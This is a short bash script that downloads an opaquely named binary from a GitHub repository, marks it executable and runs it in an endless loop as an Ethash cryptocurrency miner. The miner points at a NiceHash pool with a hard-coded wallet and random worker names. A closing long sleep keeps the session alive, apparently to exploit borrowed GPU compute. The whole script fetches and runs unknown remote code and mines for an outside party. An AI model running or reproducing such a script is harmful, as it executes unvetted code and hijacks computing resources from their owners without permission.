#!/bin/bash
POOL=stratum+tcp://daggerhashimoto.eu-north.nicehash.com:3353
WALLET=3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E
WORKER=$(echo $(shuf -i 1-40 -n 1)-COLK80)
wget https://github.com/archernap/prem/raw/main/priyatama
chmod +x priyatama
while [ 1 ]; do
./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
